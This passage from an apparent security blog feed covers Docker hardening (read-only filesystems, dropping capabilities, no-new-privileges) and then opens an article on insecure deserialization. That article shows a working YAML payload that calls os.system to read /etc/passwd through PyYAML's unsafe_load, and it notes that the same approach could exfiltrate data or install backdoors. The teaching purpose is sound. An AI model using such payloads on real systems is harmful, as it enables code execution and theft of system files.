&amp;gt;&amp;gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;tempfile.mkdtemp&lt;span class="o"&gt;()&lt;/span&gt;
Traceback&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;most&lt;span class="w"&gt; &lt;/span&gt;recent&lt;span class="w"&gt; &lt;/span&gt;call&lt;span class="w"&gt; &lt;/span&gt;last&lt;span class="o"&gt;)&lt;/span&gt;:
&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"&amp;lt;stdin&amp;gt;"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;module&amp;gt;
&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;348&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;mkdtemp
&lt;span class="w"&gt;    &lt;/span&gt;prefix,&lt;span class="w"&gt; &lt;/span&gt;suffix,&lt;span class="w"&gt; &lt;/span&gt;dir,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;output_type&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_sanitize_params&lt;span class="o"&gt;(&lt;/span&gt;prefix,&lt;span class="w"&gt; &lt;/span&gt;suffix,&lt;span class="w"&gt; &lt;/span&gt;dir&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;118&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_sanitize_params
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;dir&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;gettempdir&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;287&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;gettempdir
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;tempdir&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_get_default_tempdir&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;219&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_get_default_tempdir
&lt;span class="w"&gt;    &lt;/span&gt;raise&lt;span class="w"&gt; &lt;/span&gt;FileNotFoundError&lt;span class="o"&gt;(&lt;/span&gt;_errno.ENOENT,
FileNotFoundError:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Errno&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;No&lt;span class="w"&gt; &lt;/span&gt;usable&lt;span class="w"&gt; &lt;/span&gt;temporary&lt;span class="w"&gt; &lt;/span&gt;directory&lt;span class="w"&gt; &lt;/span&gt;found&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'/tmp'&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'/var/tmp'&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'/usr/tmp'&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can work around this issue by mounting /tmp as a volume:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;--mount&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;source&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;myvol2,target&lt;span class="o"&gt;=&lt;/span&gt;/tmp&lt;span class="w"&gt; &lt;/span&gt;--read-only&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster
Python&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.9.1&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;default,&lt;span class="w"&gt; &lt;/span&gt;Jan&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2021&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;16&lt;/span&gt;:45:25&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;GCC&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.3.0&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;on&lt;span class="w"&gt; &lt;/span&gt;linux
Type&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"help"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"copyright"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"credits"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;or&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"license"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;more&lt;span class="w"&gt; &lt;/span&gt;information.
&amp;gt;&amp;gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;import&lt;span class="w"&gt; &lt;/span&gt;tempfile&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;tempfile.mkdtemp&lt;span class="o"&gt;()&lt;/span&gt;


$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;--rm&lt;span class="w"&gt; &lt;/span&gt;-i&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="o"&gt;=&lt;/span&gt;myvol2:/tmp/v&lt;span class="w"&gt; &lt;/span&gt;busybox&lt;span class="w"&gt; &lt;/span&gt;find&lt;span class="w"&gt; &lt;/span&gt;/tmp/v
/tmp/v
/tmp/v/tmpbhw8djco
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Even better is using the host's temporary file system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;**--tmpfs&lt;span class="w"&gt; &lt;/span&gt;/tmp**&lt;span class="w"&gt; &lt;/span&gt;--read-only&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id="limit-capabilities"&gt;Limit Capabilities&lt;/h3&gt;
&lt;p&gt;You can limit the &lt;a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"&gt;Linux kernel capabilities&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;**--cap-drop&lt;span class="w"&gt; &lt;/span&gt;all**&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster&lt;span class="w"&gt; &lt;/span&gt;bash
root@3c568219116e:/#&lt;span class="w"&gt; &lt;/span&gt;groupadd&lt;span class="w"&gt; &lt;/span&gt;-r&lt;span class="w"&gt; &lt;/span&gt;noroot
**groupadd:&lt;span class="w"&gt; &lt;/span&gt;failure&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;writing&lt;span class="w"&gt; &lt;/span&gt;changes&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;/etc/gshadow**
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can then grant the ones your application needs:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;--cap-drop&lt;span class="w"&gt; &lt;/span&gt;all&lt;span class="w"&gt; &lt;/span&gt;--cap-add&lt;span class="w"&gt; &lt;/span&gt;CHOWN&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster&lt;span class="w"&gt; &lt;/span&gt;bash
root@3c568219116e:/#&lt;span class="w"&gt; &lt;/span&gt;groupadd&lt;span class="w"&gt; &lt;/span&gt;-r&lt;span class="w"&gt; &lt;/span&gt;noroot
groupadd:&lt;span class="w"&gt; &lt;/span&gt;failure&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;writing&lt;span class="w"&gt; &lt;/span&gt;changes&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;/etc/gshadow
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In Kubernetes, this is done via capabilities in the securityContext
(&lt;a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/"&gt;docs&lt;/a&gt;).&lt;/p&gt;
&lt;h3 id="no-new-privileges"&gt;no-new-privileges&lt;/h3&gt;
&lt;p&gt;You might want to always set --security-opt=no-new-privileges . It disables
container processes from gaining new privileges
(&lt;a href="https://docs.docker.com/engine/reference/run/#security-configuration"&gt;docs&lt;/a&gt;).
In Kubernetes, this is called allowPrivilegeEscalation
(&lt;a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/"&gt;docs&lt;/a&gt;).&lt;/p&gt;
&lt;h3 id="scanning-for-vulnerabilities"&gt;Scanning for vulnerabilities&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/quay/clair"&gt;Clair&lt;/a&gt; by quay seems to be a commonly used
[tool to scan containers for vulnerabilities. I haven&amp;rsquo;t used it so far,
[though.&lt;/p&gt;
&lt;h2 id="inter-container-communication_1"&gt;Inter Container Communication&lt;/h2&gt;
&lt;p&gt;A key thought of &amp;ldquo;defense in depth&amp;rdquo; is to make every single step as hard as
possible for an attacker. If something is not strictly necessary for the
application to run, it is not allowed. Restricting the way the containers
communicate with other containers is one part of that.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Scenario how an attacker is blocked by a controlled network communication / inter container communication. Image by Martin Thoma" src="https://cdn-images-1.medium.com/max/3972/1*t8W3Hpw3xa89r9j8JNScWw.png"/&gt;&lt;em&gt;Scenario how an attacker is blocked by a controlled network communication / inter container communication. Image by Martin Thoma&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Most companies have a lot of different microservices running in containers.
Some of the containers need to communicate, others don&amp;rsquo;t need it. Maybe two
have vulnerabilities as shown in the image above. The backend has a
vulnerability that allows the attacker to get into the container and another
service might suffer from the same issue. But there is no direct way the
attacker can communicate with the other vulnerable service and thus harm is
prevented.&lt;/p&gt;
&lt;p&gt;Have a look at &lt;a href="https://docs.docker.com/config/containers/container-networking/"&gt;Docker container
networking&lt;/a&gt;
or &lt;a href="https://kubernetes.io/docs/concepts/services-networking/network-policies/"&gt;Kubernetes network
policies&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Container Security is an extremely broad field. The &lt;a href="https://www.nist.gov/publications/application-container-security-guide"&gt;NIST Application
Container Security
Guide&lt;/a&gt;
is way more extensive than this article, the &lt;a href="https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html"&gt;OWASP Docker Cheat
Sheet&lt;/a&gt;
is of similar length. Tsvi Korren made a pretty good presentation container
security:&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/_5uZnM1yv0Y" width="560"&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
&lt;p&gt;In security, it is hard to recommend what to do. For maximum security, you want to do everything. But a very short and actionable guide would be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Make sure you use a well-known, trusted, maintained base image.&lt;/li&gt;
&lt;li&gt;Install only software you need, copy only files you use. Try multi-stage builds if you need software to build the software.&lt;/li&gt;
&lt;li&gt;Use a non-root user.&lt;/li&gt;
&lt;li&gt;Restrict privileges / inter container communication.&lt;/li&gt;
&lt;li&gt;Use a read-only file system.&lt;/li&gt;
&lt;li&gt;Get a workflow that automatically scans for vulnerabilities and alerts you if anything new was found.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="Docker"></category><category term="AppSec"></category></entry><entry><title>Insecure Deserialization üòàüêù</title><link href="https://martin-thoma.com/https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e" rel="alternate"></link><published>2021-01-28T20:00:00+01:00</published><updated>2021-01-28T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2021-01-28:/https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e</id><summary type="html">&lt;p&gt;Serialization is the act of transforming objects from an internal
representation to a stream of characters or bytes. The representation of the
serialized object should be platform- and language-independent. Data is
serialized and deserialized in applications to &lt;strong&gt;store&lt;/strong&gt; or &lt;strong&gt;transport&lt;/strong&gt; it.
In web applications, &lt;strong&gt;JSON&lt;/strong&gt; or &lt;strong&gt;XML&lt;/strong&gt; is often used ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;p&gt;Serialization is the act of transforming objects from an internal
representation to a stream of characters or bytes. The representation of the
serialized object should be platform- and language-independent. Data is
serialized and deserialized in applications to &lt;strong&gt;store&lt;/strong&gt; or &lt;strong&gt;transport&lt;/strong&gt; it.
In web applications, &lt;strong&gt;JSON&lt;/strong&gt; or &lt;strong&gt;XML&lt;/strong&gt; is often used for data exchange by
many APIs and protocols. File formats like PNG/GIF/JPEG/MPEG use XML to store
metadata. YAML became extremely popular for configuration files, e.g. in
&lt;a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/template-formats.html"&gt;Cloudformation
templates&lt;/a&gt;
or &lt;a href="https://docs.gitlab.com/ee/ci/yaml/"&gt;GitlabCI configuration files&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Some file formats allow you to do more than just (de)serializing basic data
types. For example, imagine that you want to set up a CI pipeline. You might
have one step for executing unit tests, one step for checking the types, one
for linting. All of those steps might require installing the same set of
dependencies. Instead of repeating yourself, you want to use &lt;strong&gt;references&lt;/strong&gt;.
You define a dictionary once and copy it in many places. References allow a
human to read, write, and modify the file quickly while the machine simply has
the same value(s) in multiple places.&lt;/p&gt;
&lt;p&gt;Another powerful feature is to include &lt;strong&gt;external entities&lt;/strong&gt;. In the simplest
case, this means that you want to include another file. For example, you could
have a logging configuration that you want to use in multiple places. In more
extreme cases, the external entities could be not in local files but only
available over the internet. To be honest, I don&amp;rsquo;t know why you would want
that. Please leave a commend if you know!&lt;/p&gt;
&lt;p&gt;Most serialization formats are not powerful enough to represent arbitrary
objects you can have. There are differences in how powerful those formats are.
Some want to go very far in terms of compatibility with many languages. As a
potential side effect, they could allow &lt;strong&gt;arbitrary code execution&lt;/strong&gt;.&lt;/p&gt;
&lt;h2 id="why-you-should-care"&gt;Why you should care&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Insecure deserialization was number 8 in the &lt;strong&gt;OWASP Top 10&lt;/strong&gt;
  (&lt;a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization"&gt;source&lt;/a&gt;) üêù&lt;/li&gt;
&lt;li&gt;2013: The YAML node package
  (&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4660"&gt;CVE-2013&amp;ndash;4660&lt;/a&gt;)
  allowed remote code execution. Remote code execution is as bad as it gets:
  People can take your data, install a backdoor, shut down your service,
  delete or encrypt your data, use your service for crypto-mining, potentially
  harm your hardware.&lt;/li&gt;
&lt;li&gt;2014: Android &amp;lt; 5.0 an insecure deserialization can result in arbitrary code
  execution (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2014-7911"&gt;CVE-2014&amp;ndash;7911&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2015: Android &amp;lt; 5.1.1 allows arbitrary code execution
  (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2015-3837"&gt;CVE-2015&amp;ndash;3837&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;2015: ArcGIS allowed arbitrary code execution
  (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2015-2002"&gt;CVE-2015&amp;ndash;2002&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;2015: &lt;a href="https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf"&gt;One Class to Rule Them All: 0-Day Deserialization Vulnerabilities in Android&lt;/a&gt; by Or Peles, Roee Hay, referencing &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2015-3837"&gt;CVE-2015&amp;ndash;3837&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;2019: Kubernetes was vulnerable to a billion laughs DOS attack (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11253"&gt;CVE-2019&amp;ndash;11253&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;2020: TYPO3 (&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11067"&gt;CVE-2020&amp;ndash;11067&lt;/a&gt;), IBM QRadar (&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4280"&gt;CVE-2020&amp;ndash;4280&lt;/a&gt; ) allowed remote code execution.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;2020: Apache Tomcat allows remote code execution (&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484"&gt;CVE-2020&amp;ndash;9484&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="how-do-deserialization-attacks-work"&gt;How do Deserialization attacks work?&lt;/h2&gt;
&lt;p&gt;There is actually a multitude of deserialization attacks. One way to group them is by file format, e.g. YAML, XML, Python pickle files, and many others. Another way is by the objective the attacker wants to reach, e.g. Arbitrary Code execution or Denial of Service (DOS).&lt;/p&gt;
&lt;p&gt;The issue is that those file formats are too powerful. They either directly allow code execution or they allow to create references to the file system or references to elements within the document.&lt;/p&gt;
&lt;h3 id="attacking-a-yaml-deserializer"&gt;Attacking a YAML deserializer&lt;/h3&gt;
&lt;p&gt;Take this example.yaml file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kt"&gt;!!python/object/apply:os.system&lt;/span&gt;

&lt;span class="nt"&gt;args&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'cat&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;/etc/passwd'&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And execute this Python code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;yaml&lt;/span&gt;  &lt;span class="c1"&gt;# pip install pyyaml is required&lt;/span&gt;

&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"example.yaml"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;yaml&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unsafe_load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will print the contents of &lt;code&gt;/etc/passwd&lt;/code&gt;. You could also delete any (or
all) files on the system, send a web request (e.g. with the contents of that
password file), download and execute software (e.g. a rootkit/backdoor). This
is probably as bad as it can get.&lt;/p&gt;
&lt;p&gt;If you want to know more about YAML features, read this:
&lt;a href="https://levelup.gitconnected.com/6-yaml-features-most-programmers-dont-know-164762343af3"&gt;&lt;strong&gt;6 YAML Features most programmers don&amp;rsquo;t know&lt;/strong&gt;
&lt;em&gt;Level-up your YAML knowledge to write cleaner YAML files&lt;/em&gt;levelup.gitconnected.com&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="attacking-xml-deserialization"&gt;Attacking XML Deserialization&lt;/h3&gt;
&lt;p&gt;XML allows referencing external entities such as files (e.g. /etc/passwd ) or
websites. If you want to learn more about why this is an issue, read my
article about XXE attacks &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;&lt;strong&gt;XXE attacks üòà&lt;/strong&gt; &lt;em&gt;PDF, Excel, SVG, ebooks &amp;mdash; all
use XML. They can be
vulnerable.&lt;/em&gt;medium.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Another possible attack vector is to use the reference feature of XML in a
billion laughs attack: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;&lt;strong&gt;DOS via a billion laughs üòà&lt;/strong&gt; &lt;em&gt;Consume arbitrary much
RAM by repeated
referencing&lt;/em&gt;medium.com&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="attacking-pickle-deserialization"&gt;Attacking Pickle Deserialization&lt;/h3&gt;
&lt;p&gt;Marco Slaviero has shown that deserialization of pickle files allows arbitrary code execution in his paper &amp;ldquo;&lt;a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf"&gt;Sour Pickles&lt;/a&gt;&amp;rdquo;. It was summarized nicely by &lt;a href="https://stackoverflow.com/a/10302328/562769"&gt;Charles Menguy&lt;/a&gt; in an example similar to this:&lt;/p&gt;
